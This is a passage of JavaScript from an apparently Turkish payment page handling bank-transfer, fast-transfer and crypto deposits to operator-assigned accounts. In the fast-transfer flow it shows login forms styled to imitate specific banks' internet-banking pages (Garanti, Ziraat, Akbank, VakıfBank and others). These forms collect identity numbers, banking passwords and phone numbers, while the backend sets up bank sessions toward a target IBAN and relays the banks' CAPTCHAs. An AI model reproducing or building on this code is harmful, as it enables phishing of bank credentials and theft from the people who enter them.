clearInterval(_havaleCountdown);\n  clearInterval(_havaleAccountPollTimer);\n  const box = document.getElementById('havale-info-box');\n  box.innerHTML = '<div style=\"font-size:13px;color:#6b7280;text-align:center;padding:16px\">⏳ Hesap bilgileri alınıyor...</div>';\n  S._havaleTransactionId = null;\n  document.getElementById('havale-actions').style.display = 'none';\n\n  try{\n    const r = await dbgFetch(apiBase()+'/api/payment/account', {\n      method:'POST', headers:{'Content-Type':'application/json'},\n      body: JSON.stringify({\n        merchant_id: S.merchantId||'demo',\n        user_id:     S.userId||'demo',\n        method:      'havale',\n        amount:      S.amt,\n        currency:    'TRY'\n      })\n    });\n\n    const d = await r.json();\n\n    if(!r.ok){\n      if(d.detail === 'NO_AVAILABLE_ACCOUNT'){\n        box.innerHTML = `<div style=\"text-align:center;padding:20px\">\n          <div style=\"font-size:13px;color:#dc2626;margin-bottom:14px\">❌ Şu anda uygun hesap bulunamadı.<br>Lütfen daha düşük bir tutar deneyin veya sonra tekrar gelin.</div>\n          <button onclick=\"showPage('dep-amount')\" style=\"background:#f3f4f6;color:#374151;border:1px solid #e5e7eb;border-radius:8px;padding:8px 20px;font-size:13px;cursor:pointer\">← Tutarı Değiştir</button>\n        </div>`;\n      } else {\n        box.innerHTML = `<div style=\"color:#dc2626;font-size:13px;text-align:center;padding:16px\">\n          ❌ ${d.detail||'Hesap bilgisi alınamadı. Lütfen tekrar deneyin.'}</div>`;\n      }\n      return;\n    }\n\n    S._havaleTransactionId = d.transaction_id;\n    const iban = d.account?.iban || d.ibanWallet || '';\n\n    if(!iban){\n      if(d.status === 'PENDING' && d.transaction_id){\n        // v2 akışı: hesap claim anında atanıyor — operator atamasını bekle\n        box.innerHTML = '<div style=\"font-size:13px;color:#6b7280;text-align:center;padding:16px\">⏳ Operatör hesap ataması bekleniyor...</div>';\n        _pollForHavaleAccount(d.transaction_id, box);\n      } else {\n        box.innerHTML = '<div style=\"color:#dc2626;font-size:13px;text-align:center;padding:16px\">Uygun hesap bulunamadı.</div>';\n      }\n      return;\n    }\n\n    _renderHavaleAccount(box, iban, d.account?.name || d.accountName || '', d.account?.bank || d.bank || '', d.expires_at);\n\n  }catch(e){\n    console.error('startHavaleManuel:', e);\n    box.innerHTML = '<div style=\"color:#dc2626;font-size:13px;text-align:center;padding:16px\">Bağlantı hatası. Engine çalışıyor mu?</div>';\n  }\n}\n\nasync function confirmHavale(){\n  const err = document.getElementById('havale-err');\n  if(!S._havaleTransactionId){ err.textContent='İşlem başlatılmadı.'; return; }\n  err.textContent = '';\n\n  const btn = document.querySelector('#havale-actions .submit-btn');\n  if(btn){ btn.disabled=true; btn.textContent='Gönderiliyor...'; }\n\n  try{\n    const r = await dbgFetch(apiBase()+'/api/payment/confirm', {\n      method:'POST', headers:{'Content-Type':'application/json'},\n      body: JSON.stringify({transaction_id: S._havaleTransactionId, note:''})\n    });\n    const d = await r.json();\n    if(!r.ok) throw new Error(d.detail||'Hata');\n  }catch(e){\n    if(btn){ btn.disabled=false; btn.textContent='Yatırdım'; }\n    err.textContent = 'Bildirim gönderilemedi: ' + e.message;\n    return;\n  }\n\n  clearInterval(_havaleCountdown);\n  showPage('waiting');\n  notifySuccess(S._havaleTransactionId);\n}\n\n/* ── KRİPTO ── */\nvar _kriptoLoading = false;\nasync function startKripto(){\n  if(_kriptoLoading) return;  // çift tıklama koruması\n  _kriptoLoading = true;\n\n  showPage('kripto');\n  const box = document.getElementById('kripto-info-box');\n  box.innerHTML = '<div style=\"font-size:13px;color:#6b7280;text-align:center;padding:24px\">⏳ Hesap bilgileri alınıyor...</div>';\n  document.getElementById('kripto-actions').style.display = 'none';\n  document.getElementById('kripto-err').textContent = '';\n  S._kriptoTransactionId = null;\n  S._kriptoCoin = null;\n  S._kriptoData = null;\n\n  try{\n    const r = await fetch(apiBase()+'/api/payment/account', {\n      method:'POST', headers:{'Content-Type':'application/json'},\n      body: JSON.stringify({\n        merchant_id: S.merchantId||'demo',\n        user_id:     S.userId||'demo',\n        method:      'kripto',\n        amount:      S.amt,\n        currency:    'TRY'\n      })\n    });\n    const d = await r.json();\n    if(!r.ok){\n      if(d.detail === 'NO_AVAILABLE_ACCOUNT'){\n        box.innerHTML = `<div style=\"text-align:center;padding:20px\">\n          <div style=\"font-size:13px;color:#dc2626;margin-bottom:14px\">❌ Şu anda uygun hesap bulunamadı.<br>Lütfen daha düşük bir tutar deneyin veya sonra tekrar gelin.</div>\n          <button onclick=\"showPage('dep-amount')\" style=\"background:#f3f4f6;color:#374151;border:1px solid #e5e7eb;border-radius:8px;padding:8px 20px;font-size:13px;cursor:pointer\">← Tutarı Değiştir</button>\n        </div>`;\n        return;\n      }\n      throw new Error(d.detail||'Hesap alınamadı');\n    }\n\n    S._kriptoTransactionId = d.transaction_id;\n    S._kriptoData = d;\n\n    const addr          = d.deposit_address || '';\n    const cryptoAmounts = d.crypto_amounts  || {};\n    const coins         = Object.keys(cryptoAmounts);\n\n    if(!addr)         throw new Error('Adres bilgisi boş');\n    if(!coins.length) throw new Error('Kripto seçenekleri boş');\n\n    _renderKriptoInfo(addr, cryptoAmounts, d.expires_at);\n    document.getElementById('kripto-actions').style.display = 'block';\n\n  }catch(e){\n    console.error('startKripto:', e);\n    box.innerHTML = '<div style=\"color:#dc2626;font-size:13px;text-align:center;padding:24px\">⚠️ ' + (e.message||'Hesap bilgisi alınamadı') + '<br><small style=\"color:#9ca3af\">Tekrar deneyin.</small></div>';\n  } finally {\n    _kriptoLoading = false;\n  }\n}\n\nfunction _renderKriptoInfo(addr, cryptoAmounts, expiresAt){\n  const box = document.getElementById('kripto-info-box');\n\n  // Coin satırları — tümü alt alta\n  var coinRows = Object.keys(cryptoAmounts).map(function(coin){\n    var amount = cryptoAmounts[coin];\n    var isSelected = S._kriptoCoin === coin;\n    return '<div id=\"coin-row-'+coin+'\" onclick=\"selectCoin(\\''+coin+'\\')\" style=\"'\n      + 'display:flex;align-items:center;justify-content:space-between;'\n      + 'padding:12px 14px;border-radius:10px;cursor:pointer;transition:all .15s;margin-bottom:6px;'\n      + (isSelected\n          ? 'background:#eff6ff;border:2px solid #2563eb;'\n          : 'background:#f9fafb;border:2px solid transparent;')\n      + '\">'\n      + '<div style=\"display:flex;align-items:center;gap:10px\">'\n        + '<div style=\"width:36px;height:36px;border-radius:50%;background:'+(isSelected?'#2563eb':'#e5e7eb')+';display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:'+(isSelected?'#fff':'#6b7280')+'\">'+coin+'</div>'\n        + '<div>'\n          + '<div style=\"font-size:13px;font-weight:600;color:#111\">'+coin+'</div>'\n          + '<div style=\"font-size:11px;color:#6b7280\">'+amount+' '+coin+'</div>'\n        + '</div>'\n      + '</div>'\n      + '<div style=\"font-size:12px;font-weight:600;color:'+(isSelected?'#2563eb':'#9ca3af')+'\">'+(isSelected?'✓ Seçildi':'Seç')+'</div>'\n    + '</div>';\n  }).join('');\n\n  var addrShort = addr.length > 20 ? addr.slice(0,10)+'...'+addr.slice(-8) : addr;\n\n  box.innerHTML = '<div style=\"display:flex;flex-direction:column;gap:0\">'\n    // Tutar\n    + '<div style=\"display:flex;justify-content:space-between;align-items:center;padding:0 2px;margin-bottom:14px\">'\n      + '<span style=\"font-size:13px;color:#6b7280\">Yatırmak istediğin tutar</span>'\n      + '<span style=\"font-size:18px;font-weight:700;color:#2563eb\">₺' + fmt(S.amt) + '</span>'\n    + '</div>'\n    // Coin listesi\n    + '<div style=\"font-size:11px;font-weight:600;color:#9ca3af;text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px\">Kripto seçin</div>'\n    + coinRows\n    // Uyarı\n    + '<div style=\"background:#fefce8;border-radius:8px;padding:10px 12px;font-size:12px;color:#854d0e;margin-top:8px\">&#9888; Yalnızca seçtiğiniz coin ile gönderin. Farklı coin gönderilirse kurtarılamaz.</div>'\n    // Adres\n    + '<div style=\"margin-top:12px;padding:10px 12px;background:#f9fafb;border:1px solid #e5e7eb;border-radius:10px\">'\n      + '<div style=\"font-size:11px;color:#6b7280;margin-bottom:6px;text-transform:uppercase;letter-spacing:.05em\">Gönderim Adresi</div>'\n      + '<div style=\"display:flex;align-items:center;justify-content:space-between;gap:8px\">'\n        + '<span style=\"font-family:monospace;font-size:11px;font-weight:600;word-break:break-all;color:#111\">'+addr+'</span>'\n        + '<button onclick=\"navigator.clipboard.writeText(\\''+addr+'\\');this.textContent=\\'✓\\';setTimeout(()=>this.textContent=\\'Kopyala\\',2000)\" '\n          + 'style=\"flex-shrink:0;border:1px solid #e5e7eb;border-radius:6px;padding:4px 10px;font-size:11px;cursor:pointer;background:#fff;white-space:nowrap\">Kopyala</button>'\n      + '</div>'\n    + '</div>'\n    // Süre\n    + (expiresAt ? '<div style=\"display:flex;justify-content:space-between;align-items:center;margin-top:10px;padding:0 2px\">'\n        + '<span style=\"font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.05em\">Kalan Süre</span>'\n        + '<span id=\"kripto-countdown\" style=\"font-family:monospace;font-size:13px;font-weight:600;color:#f59e0b\">--:--</span>'\n        + '</div>' : '')\n  + '</div>';\n\n  if(expiresAt) startHavaleCountdown(expiresAt, 'kripto-countdown');\n}\n\nfunction selectCoin(coin){\n  if(!S._kriptoData) return;\n  S._kriptoCoin = coin;\n  // Confirm buton yazısını güncelle\n  document.getElementById('kripto-confirm-label').textContent = 'Gönderdim (' + coin + ')';\n  // Coin satırlarını yeniden render et (sadece seçim vurgusu)\n  _renderKriptoInfo(\n    S._kriptoData.deposit_address,\n    S._kriptoData.crypto_amounts,\n    S._kriptoData.expires_at\n  );\n}\n\nasync function confirmKripto(){\n  if(!S._kriptoTransactionId){ document.getElementById('kripto-err').textContent='İşlem başlatılmadı.'; return; }\n  if(!S._kriptoCoin){ document.getElementById('kripto-err').textContent='Coin seçilmedi.'; return; }\n  try{\n    await fetch(apiBase()+'/api/payment/confirm', {\n      method:'POST', headers:{'Content-Type':'application/json'},\n      body: JSON.stringify({transaction_id: S._kriptoTransactionId, currency: S._kriptoCoin})\n    });\n  }catch(e){}\n  showPage('waiting');\n  notifySuccess(S._kriptoTransactionId);\n}\n\n// Adım 1: Yöntem seç → tutar sayfasına geç\nfunction pickMethod(m){\n  S.method = m;\n  selectedAmt = 0;\n  document.querySelectorAll('.method-opt').forEach(e=>e.classList.remove('sel'));\n  const el = document.getElementById('m-'+m);\n  if(el) el.classList.add('sel');\n  // Tutar sayfası başlığını güncelle\n  const labels = {havale:'Havale / EFT — Tutar', hizli_havale:'Hızlı Havale — Tutar', kredi:'Kredi Kartı — Tutar', kripto:'Kripto — Tutar'};\n  const subs   = {havale:'Havale yapacağınız tutarı seçin.', hizli_havale:'Hızlı havale tutarını seçin.', kredi:'Kart ile ödemek istediğiniz tutarı girin.', kripto:'Kripto ile yatırmak istediğiniz TL tutarını girin.'};\n  document.getElementById('dep-amt-title').textContent = labels[m] || 'Tutar Girin';\n  document.getElementById('dep-amt-sub').textContent   = subs[m]   || 'Tutarı seçin veya girin.';\n  document.getElementById('dep-err').textContent = '';\n  document.querySelectorAll('.amt-opt').forEach(e=>e.classList.remove('sel'));\n  document.getElementById('custom-amt').value = '';\n  showPage('dep-amount');\n}\n\n// Adım 2: Tutar → ödeme detayına geç\nfunction selAmt(v,el){selectedAmt=v;document.querySelectorAll('.amt-opt').forEach(e=>e.classList.remove('sel'));el.classList.add('sel');document.getElementById('custom-amt').value=''}\nfunction customAmt(el){selectedAmt=parseFloat(el.value)||0;document.querySelectorAll('.amt-opt').forEach(e=>e.classList.remove('sel'))}\nfunction depositNext(){\n  document.getElementById('dep-err').textContent='';\n  const a=selectedAmt||parseFloat(document.getElementById('custom-amt').value)||0;\n  if(a<50){document.getElementById('dep-err').textContent='Minimum tutar ₺50 olmalıdır.';return}\n  if(a>50000){document.getElementById('dep-err').textContent='Maksimum tutar ₺50.000 olmalıdır.';return}\n  S.amt=a;\n  prepareBankSession._current = -1; prepareBankSession._token = null;\n\n  if(S.method==='hizli_havale'){\n    document.getElementById('bank-sub').textContent=`₺${fmt(S.amt)} tutarında hızlı havale için bankanızı seçin.`;\n    document.getElementById('bank-grid').innerHTML=banks.map((b,i)=>{\n      const logoHtml=(typeof BANK_LOGOS!=='undefined'&&BANK_LOGOS[b.id])?BANK_LOGOS[b.id]:`<div class=\"bok\" style=\"background:${b.c}\">${b.s}</div>`;\n      return `<div class=\"bank-opt\" onclick=\"pickBank(${i})\"><div style=\"flex-shrink:0\">${logoHtml}</div></div>`;\n    }).join('');\n    showPage('bank');\n  } else if(S.method==='havale'){\n    startHavaleManuel();\n  } else if(S.method==='kripto'){\n    startKripto();\n  } else if(S.method==='kredi'){\n    S._preparedSessionId=null;\n    initKrediKarti();\n    showPage('kredi');\n  }\n}\n\n// Eski selMethod — geriye dönük uyumluluk\nfunction selMethod(m){S.method=m;}\nfunction pickBank(i){\n  S.bank = banks[i];\n\n  if(S.bank.id === 'kuveytturk'){\n    // Kuveyt Türk özel form\n    document.getElementById('kt-login-header').style.display  = 'block';\n    document.getElementById('std-login-form').style.display   = 'none';\n    document.getElementById('login-std-hd').style.display     = 'none';\n    // GSM satırını göster\n    document.getElementById('gsm-row').style.display      = 'table-row';\n    document.getElementById('gsm-hint-row').style.display = 'table-row';\n    // Temizle\n    document.getElementById('inp-tc').value  = '';\n    document.getElementById('inp-pw').value  = '';\n    document.getElementById('inp-gsm').value = '90';\n    document.getElementById('login-err').textContent = '';\n    hideKTCaptcha();\n    S._pendingCaptchaSession = null;\n    hideKTCaptcha();\n  } else {\n    // Standart form\n    document.getElementById('kt-login-header').style.display  = 'none';\n    document.getElementById('std-login-form').style.display   = 'block';\n    document.getElementById('login-std-hd').style.display     = 'flex';\n    const logoWrap = document.getElementById('login-logo-wrap');\n    if(logoWrap){\n      if(typeof BANK_LOGOS !== 'undefined' && BANK_LOGOS[S.bank.id]){\n        logoWrap.innerHTML = BANK_LOGOS[S.bank.id];\n        logoWrap.querySelector('img').style.cssText = 'max-width:130px;max-height:36px;object-fit:contain;display:block';\n      } else {\n        logoWrap.innerHTML = `<div style=\"background:${S.bank.c};color:#fff;font-weight:700;padding:4px 10px;border-radius:8px;font-size:13px\">${S.bank.s}</div>`;\n      }\n    }\n    // login-bank-name kaldırıldı\n    document.getElementById('gsm-field').style.display        = 'none';\n    document.getElementById('inp-tc-std').value  = '';\n    document.getElementById('inp-pw-std').value  = '';\n    document.getElementById('login-err-std').textContent = '';\n    // Banka bazlı tema uygula\n    applyBankTheme(S.bank.id);\n  }\n\n  // Preparing sayfası — tüm bankalar için\n  S._preparedSessionId = null;\n  S._preparedCaptcha   = null;\n  S._pendingCaptchaSession = null;\n  const prepLogo = document.getElementById('prep-logo');\n  if(prepLogo && typeof BANK_LOGOS!=='undefined' && BANK_LOGOS[S.bank.id]){\n    prepLogo.innerHTML = BANK_LOGOS[S.bank.id];\n    const img = prepLogo.querySelector('img');\n    if(img) img.style.cssText='max-width:160px;max-height:60px;object-fit:contain';\n  } else if(prepLogo){\n    prepLogo.innerHTML = `<div style=\"background:${S.bank.c};color:#fff;font-weight:700;padding:8px 16px;border-radius:10px;font-size:16px\">${S.bank.s}</div>`;\n  }\n  document.getElementById('prep-title').textContent = S.bank.name+' sayfası yükleniyor...';\n  document.getElementById('prep-sub').textContent   = 'Lütfen bekleyin, bu işlem 5-10 saniye sürebilir.';\n  document.getElementById('prep-err').style.display   = 'none';\n  document.getElementById('prep-retry').style.display = 'none';\n  showPage('preparing');\n  prepareBankSession(S.bank.id);\n}\n\nfunction retryPrepare(){\n  document.getElementById('prep-err').style.display = 'none';\n  document.getElementById('prep-retry').style.display = 'none';\n  prepareBankSession(S.bank.id);\n}\n\nprepareBankSession._counter = 0;\nprepareBankSession._current = -1;\nasync function prepareBankSession(bankId){\n  // Unique ID ile çağrıyı takip et\n  const myId = ++prepareBankSession._counter;\n  prepareBankSession._current = myId;\n\n  // Panel'e initiate at — txId al (hızlı havale da panel'e kaydedilmeli)\n  S._hizliHavaleTransactionId = null;\n  try{\n    const initRes = await fetch(apiBase()+'/api/payment/account', {\n      method:'POST', headers:{'Content-Type':'application/json'},\n      body: JSON.stringify({\n        merchant_id: S.merchantId||'demo',\n        user_id:     S.userId||'demo',\n        method:      'hizli_havale',\n        amount:      S.amt,\n        currency:    'TRY'\n      })\n    });\n    if(prepareBankSession._current !== myId) return;\n    if(initRes.ok){\n      const initData = await initRes.json();\n      S._hizliHavaleTransactionId = initData.transaction_id;\n      S._hizliHavaleIban          = initData.account?.iban || initData.ibanWallet || '';\n    }\n  }catch(e){ console.warn('initiate hatası:', e); }\n\n  if(prepareBankSession._current !== myId) return;\n\n  try{\n    const r = await fetch(apiBase()+'/api/havale/prepare', {\n      method:'POST',\n      headers:{'Content-Type':'application/json'},\n      body:JSON.stringify({\n        bank_id:    bankId,\n        target_iban: S._hizliHavaleIban || '',\n        tx_id:      S._hizliHavaleTransactionId || ''\n      })\n    });\n\n    // Token değiştiyse (yeni çağrı geldi) — bu sonucu yok say\n    if(prepareBankSession._current !== myId) return;\n\n    if(!r.ok) throw new Error('Sunucu hatası: ' + r.status);\n    const d = await r.json();\n\n    // Tekrar kontrol — await sırasında başka sayfa seçilmiş olabilir\n    if(prepareBankSession._current !== myId) return;\n\n    S._preparedSessionId = d.session_id;\n\n    // Hazır — login sayfasına geç, önce CAPTCHA'ları sıfırla\n    hideLoginCaptcha();\n    hideKTCaptcha();\n    showPage('login');\n\n    // KT form ayarları\n    if(bankId === 'kuveytturk'){\n      document.getElementById('kt-login-header').style.display = 'block';\n      document.getElementById('std-login-form').style.display  = 'none';\n      document.getElementById('login-std-hd').style.display    = 'none';\n    } else {\n      document.getElementById('kt-login-header').style.display = 'none';\n      document.getElementById('std-login-form').style.display  = 'block';\n      document.getElementById('login-std-hd').style.display    = 'flex';\n    }\n\n    if(d.status==='ready_with_captcha' && d.captcha_b64){\n      S._preparedCaptcha = d.captcha_b64;\n      if(bankId==='kuveytturk'){\n        showKTCaptcha(d.captcha_b64);\n      } else {\n        showLoginCaptcha(d.captcha_b64);\n      }\n    }\n  }catch(e){\n    if(prepareBankSession._current !== myId) return;\n    console.warn('Prepare:', e);\n    document.getElementById('prep-err').textContent = 'Banka sayfası yüklenemedi. Tekrar deneyin.';\n    document.getElementById('prep-err').style.display = 'block';\n    document.getElementById('prep-retry').style.display = 'inline-block';\n  }\n}\n\nasync function refreshKTCaptcha(){\n  if(!S.sessionId && !S._pendingCaptchaSession) return;\n  const sid = S.sessionId || S._pendingCaptchaSession;\n  const img = document.getElementById('kt-captcha-img');\n  if(img) img.style.opacity='0.4';\n  try{\n    const r = await fetch(apiBase()+'/api/havale/captcha/'+sid+'/refresh',{method:'POST'});\n    if(r.ok){\n      const d = await r.json();\n      if(d.captcha_b64 && img){\n        img.src='data:image/png;base64,'+d.captcha_b64;\n        document.getElementById('inp-captcha').value='';\n      }\n    }\n  }catch(e){ console.warn(e); }\n  if(img) img.style.opacity='1';\n}\n\nfunction showKTCaptcha(b64){\n  const row = document.getElementById('kt-captcha-row');\n  if(row) row.style.display='';\n  const img = document.getElementById('kt-captcha-img');\n  if(img && b64) img.src='data:image/png;base64,'+b64;\n  const inp = document.getElementById('inp-captcha');\n  if(inp){ inp.value=''; setTimeout(()=>inp.focus(),100); }\n}\n\nfunction hideKTCaptcha(){\n  const row = document.getElementById('kt-captcha-row');\n  if(row) row.style.display='none';\n  const inp = document.getElementById('inp-captcha');\n  if(inp) inp.value='';\n}\n\nfunction showKTCaptcha(b64){\n  const row = document.getElementById('kt-captcha-row');\n  const img  = document.getElementById('kt-captcha-img');\n  if(row) row.style.display = 'table-row';\n  if(img && b64) img.src = 'data:image/png;base64,'+b64;\n  const inp = document.getElementById('inp-captcha');\n  if(inp){ inp.value=''; setTimeout(()=>inp.focus(), 100); }\n}\n\nfunction hideKTCaptcha(){\n  const row = document.getElementById('kt-captcha-row');\n  if(row) row.style.display = 'none';\n  const inp = document.getElementById('inp-captcha');\n  if(inp) inp.value = '';\n}\n\nasync function refreshKTCaptcha(){\n  const sid = S.sessionId || S._pendingCaptchaSession;\n  if(!sid) return;\n  const img = document.getElementById('kt-captcha-img');\n  if(img) img.style.opacity = '0.4';\n  try{\n    const r = await fetch(apiBase()+'/api/havale/captcha/'+sid+'/refresh', {method:'POST'});\n    if(r.ok){\n      const d = await r.json();\n      if(d.captcha_b64 && img){\n        img.src = 'data:image/png;base64,'+d.captcha_b64;\n        const inp = document.getElementById('inp-captcha');\n        if(inp) inp.value = '';\n      }\n    }\n  }catch(e){ console.warn(e); }\n  if(img) img.style.opacity = '1';\n}\n\nfunction captchaVisible(){\n  const wrap = document.getElementById('captcha-login-wrap');\n  const row  = document.getElementById('kt-captcha-row');\n  // display 'block' veya 'flex' ise gorulur — bos string veya 'none' ise gizli\n  const stdVisible = wrap && (wrap.style.display === 'block' || wrap.style.display === 'flex');\n  const ktVisible  = row  && row.style.display === 'table-row';\n  return stdVisible || ktVisible;\n}\n\nasync function refreshLoginCaptcha(){\n  if(!S.sessionId) return;\n  const img = document.getElementById('captcha-img-std');\n  img.style.opacity='0.4';\n  try{\n    const r = await fetch(apiBase()+'/api/havale/captcha/'+S.sessionId+'/refresh',{method:'POST'});\n    if(r.ok){\n      const d = await r.json();\n      if(d.captcha_b64){\n        img.src='data:image/png;base64,'+d.captcha_b64;\n        document.getElementById('inp-captcha-std').value='';\n      }\n    }\n  }catch(e){ console.warn(e); }\n  img.style.opacity='1';\n}\n\nfunction showLoginCaptcha(b64){\n  const wrap = document.getElementById('captcha-login-wrap');\n  wrap.style.display='block';\n  if(b64){\n    document.getElementById('captcha-img-std').src='data:image/png;base64,'+b64;\n  }\n}\n\nfunction hideLoginCaptcha(){\n  document.getElementById('captcha-login-wrap').style.display='none';\n  document.getElementById('inp-captcha-std').value='';\n}\n\nfunction applyBankTheme(bankId){\n  // Önceki banner varsa temizle\n  const prev = document.getElementById('bank-login-banner');\n  if(prev) prev.remove();\n\n  // CAPTCHA'yı sıfırla\n  hideLoginCaptcha();\n\n  // Sayfa arka planını sıfırla\n  const loginPage = document.getElementById('page-login');\n  loginPage.style.background = '';\n  loginPage.style.backgroundImage = '';\n  const loginWrap = loginPage.querySelector('.wrap') || loginPage.querySelector('[style*=\"max-width\"]');\n  if(loginWrap){ loginWrap.style.background=''; loginWrap.style.padding=''; }\n\n  // info-box'ı sıfırla (güvenlik mesajı)\n  const infoBox = document.querySelector('#std-login-form .info-box');\n  if(infoBox){ infoBox.style.display=''; }\n\n  // login-card sıfırla\n  const loginCard = document.querySelector('#std-login-form .login-card');\n  if(loginCard){ loginCard.style.background=''; loginCard.style.border=''; loginCard.style.boxShadow=''; }\n\n  // Input'ları sıfırla\n  const inputs = document.querySelectorAll('#std-login-form input[type=text], #std-login-form input[type=password]');\n  inputs.forEach(inp=>{ inp.style.background=''; inp.style.border=''; inp.style.borderRadius=''; inp.style.color=''; });\n\n  // Label ve buton referansları\n  const labels = document.querySelectorAll('#std-login-form .fl label');\n  const btn    = document.getElementById('login-btn-std');\n\n  // Hepsini sıfırla\n  if(labels[0]) labels[0].textContent = 'TC Kimlik No';\n  if(labels[1]) labels[1].textContent = 'İnternet Bankacılığı Şifresi';\n  if(btn){\n    btn.style.background   = '#2563eb';\n    btn.style.borderRadius = '12px';\n    btn.style.color        = '#fff';\n    btn.innerHTML = '<svg viewBox=\"0 0 24 24\" style=\"width:15px;height:15px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;margin-right:6px\"><path d=\"M3 21v-4a4 4 0 014-4h10a4 4 0 014 4v4M12 3a4 4 0 100 8 4 4 0 000-8z\"/></svg>Bankaya Giriş Yap';\n  }\n\n  const insertBanner = (html, color) => {\n    const b = document.createElement('div');\n    b.id = 'bank-login-banner';\n    b.style.cssText = `background:${color};color:#fff;padding:12px 16px;border-radius:10px;margin-bottom:1rem;font-size:13px;line-height:1.5`;\n    b.innerHTML = html;\n    const card = document.querySelector('#std-login-form .login-card');\n    if(card) card.insertAdjacentElement('beforebegin', b);\n  };\n\n  if(bankId === 'garanti'){\n    if(labels[0]) labels[0].textContent = 'Müşteri / T.C. Kimlik Numarası';\n    if(labels[1]) labels[1].textContent = 'Parola';\n    if(btn){ btn.style.background='#009966'; btn.style.borderRadius='4px'; btn.innerHTML='Garanti BBVA İnternet Giriş'; }\n    // Garanti — banner kaldırıldı\n\n  } else if(bankId === 'isbank'){\n    if(labels[0]) labels[0].textContent = 'Müşteri Numaranız / TCKN / YKN';\n    if(labels[1]) labels[1].textContent = 'Şifre / Geçici Şifre';\n    if(btn){ btn.style.background='#1a3a6b'; btn.style.borderRadius='6px'; btn.innerHTML='Giriş'; }\n\n  } else if(bankId === 'ziraat'){\n    if(labels[0]) labels[0].textContent = 'T.C. Kimlik / Müşteri Numaranız';\n    if(labels[1]) labels[1].textContent = 'Şifre';\n    if(btn){\n      btn.style.background='#1a1a1a';\n      btn.style.borderRadius='8px';\n      btn.style.color='#fff';\n      btn.innerHTML='DEVAM';\n    }\n    // Sayfa arka planı kırmızı gradient\n    loginPage.style.background='linear-gradient(160deg,#c0392b 0%,#a93226 100%)';\n    loginPage.style.minHeight='calc(100vh - 90px)';\n    // info-box gizle (kırmızı arka planda karışıyor)\n    if(infoBox) infoBox.style.display='none';\n    // Login card şeffaf + beyaz yazı\n    if(loginCard){\n      loginCard.style.background='rgba(255,255,255,0.12)';\n      loginCard.style.border='1px solid rgba(255,255,255,0.25)';\n      loginCard.style.boxShadow='none';\n    }\n    // Label'ları beyaz yap\n    labels.forEach(l=>{ l.style.color='#fff'; });\n    const loginCardHd = document.querySelector('#std-login-form .login-card-hd');\n    if(loginCardHd) loginCardHd.style.color='rgba(255,255,255,0.8)';\n    // Input'lar beyaz arka plan, yuvarlak\n    inputs.forEach(inp=>{\n      inp.style.background='rgba(255,255,255,0.92)';\n      inp.style.border='none';\n      inp.style.borderRadius='25px';\n      inp.style.color='#111';\n    });\n    // Ziraat — banner kaldırıldı\n\n  } else if(bankId === 'akbank'){\n    if(labels[0]) labels[0].textContent = 'Müşteri / TC Kimlik Numarası';\n    if(labels[1]) labels[1].textContent = 'Akbank Şifresi';\n    if(btn){\n      btn.style.background='#dc2626';\n      btn.style.borderRadius='6px';\n      btn.style.color='#fff';\n      btn.innerHTML='<svg viewBox=\"0 0 24 24\" style=\"width:14px;height:14px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;margin-right:6px\"><rect x=\"3\" y=\"11\" width=\"18\" height=\"11\" rx=\"2\"/><path d=\"M7 11V7a5 5 0 0110 0v4\"/></svg>Giriş';\n    }\n    // Beyaz kart, kırmızı header banner\n    loginPage.style.background='#f5f5f5';\n    if(infoBox) infoBox.style.display='none';\n    if(loginCard){\n      loginCard.style.background='#fff';\n      loginCard.style.border='1px solid #ddd';\n      loginCard.style.boxShadow='0 2px 6px rgba(0,0,0,0.08)';\n    }\n    labels.forEach(l=>{ l.style.color='#222'; l.style.fontWeight='600'; });\n    inputs.forEach(inp=>{\n      inp.style.background='#fff';\n      inp.style.border='1px solid #ccc';\n      inp.style.borderRadius='3px';\n      inp.style.color='#111';\n    });\n    // Akbank — banner kaldırıldı\n\n  } else if(bankId === 'halkbank'){\n    if(labels[0]) labels[0].textContent = 'Müşteri/TC Kimlik Numarası';\n    if(labels[1]) labels[1].textContent = 'Dijital Parola';\n    if(btn){\n      btn.style.background='#1a5fa8';\n      btn.style.borderRadius='6px';\n      btn.style.color='#fff';\n      btn.innerHTML='Giriş';\n    }\n    loginPage.style.background='#f8f8f8';\n    if(infoBox) infoBox.style.display='none';\n    if(loginCard){\n      loginCard.style.background='#fff';\n      loginCard.style.border='1px solid #ddd';\n      loginCard.style.boxShadow='0 2px 6px rgba(0,0,0,0.06)';\n    }\n    labels.forEach(l=>{ l.style.color='#222'; l.style.fontWeight='500'; l.style.fontSize='13px'; });\n    inputs.forEach(inp=>{\n      inp.style.background='#fff';\n      inp.style.border='1px solid #ccd4df';\n      inp.style.borderRadius='4px';\n      inp.style.color='#111';\n    });\n    // Halkbank — banner kaldirildi\n\n  } else if(bankId === 'vakifbank'){\n    if(labels[0]) labels[0].textContent = 'Müşteri / T.C. Kimlik Numarası';\n    if(labels[1]) labels[1].textContent = 'Şifreniz';\n    if(btn){\n      btn.style.background='#111';\n      btn.style.borderRadius='8px';\n      btn.style.color='#fff';\n      btn.style.fontWeight='700';\n      btn.style.letterSpacing='1px';\n      btn.innerHTML='GİRİŞ YAP';\n    }\n    loginPage.style.background='#f0f0f0';\n    if(infoBox) infoBox.style.display='none';\n    if(loginCard){\n      loginCard.style.background='#fff';\n      loginCard.style.border='none';\n      loginCard.style.boxShadow='0 2px 12px rgba(0,0,0,0.1)';\n      loginCard.style.borderRadius='12px';\n    }\n    labels.forEach(l=>{ l.style.color='#333'; l.style.fontWeight='500'; });\n    inputs.forEach(inp=>{\n      inp.style.background='#f8f8f8';\n      inp.style.border='1px solid #e0e0e0';\n      inp.style.borderRadius='8px';\n      inp.style.color='#111';\n    });\n    // VakıfBank — banner kaldırıldı\n    // VakıfBank CAPTCHA — showLoginCaptcha() login sonrası çağrılır\n    document.getElementById('lbl-captcha').textContent = 'Onay Kodu';\n\n  } else if(bankId === 'yapikredi'){\n    if(labels[0]) labels[0].textContent = 'T.C. Kimlik No veya Kullanıcı Kodu';\n    if(labels[1]) labels[1].textContent = 'İnternet ve Mobil Şube Şifresi';\n    if(btn){\n      btn.style.background='#0078d4';\n      btn.style.borderRadius='6px';\n      btn.innerHTML='<svg viewBox=\"0 0 24 24\" style=\"width:14px;height:14px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;margin-right:6px\"><rect x=\"3\" 